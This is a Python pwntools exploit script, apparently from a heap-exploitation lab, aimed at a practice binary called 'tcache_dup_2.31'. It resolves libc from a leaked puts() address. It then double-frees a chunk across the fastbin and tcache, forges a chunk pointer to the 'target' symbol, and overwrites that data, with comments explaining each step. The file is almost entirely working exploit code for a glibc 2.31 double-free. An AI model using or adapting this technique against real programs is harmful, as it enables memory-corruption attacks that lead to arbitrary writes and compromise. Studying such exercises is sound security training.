#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./tcache_dup_2.31', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc 

gs = """
b *main

b *main+262

b *main+388
b *main+473

b *main+600
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)


def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil("> ")
io.timeout = 0.1

# =============================================================================

# Request 7 0x20-sized chunks.
for n in range(7):
    malloc(0x18, "A"*8)

# Request a "dup" chunk to duplicate.
dup = malloc(0x18, "B"*8)

# Fill the 0x20 tcachebin with the first 7 chunks.
for n in range(7):
    free(n)

# Free the "dup" chunk into the 0x20 fastbin.
free(dup)

# Purge the 0x20 tcachebin.
for n in range(7):
    malloc(0x18, "C"*8)

# Double-free the "dup" chunk into the 0x20 tcachebin.
free(dup)

# The next request for a 0x20-sized chunk is serviced from the 0x20 tcachebin by the "dup" chunk.
# Request it, then overwrite its fastbin fd, pointing it near to the target data. The fd of the fake chunk
# overlapping the target must be null.
malloc(0x18, pack(elf.sym.target - 0x18))

# The next request for a 0x20-sized chunk is serviced from the 0x20 fastbin by the "dup" chunk.
# The tcache code will dump any remaining chunks from the 0x20 fastbin into the 0x20 tcachebin, including the fake chunk.
malloc(0x18, "D"*8)

# The next request for a 0x20-sized chunk is serviced from the 0x20 tcachebin by the fake chunk that overlaps the target data.
# Request it, then overwrite the target data.
malloc(0x18, "Y"*8 + "Much win")

# Check that the target data was overwritten.
io.sendthen(b"target: ", b"3")
target_data = io.recvuntil(b"\n", True)
assert target_data == b"Much win"
io.recvuntil(b"> ")

# =============================================================================

io.interactive()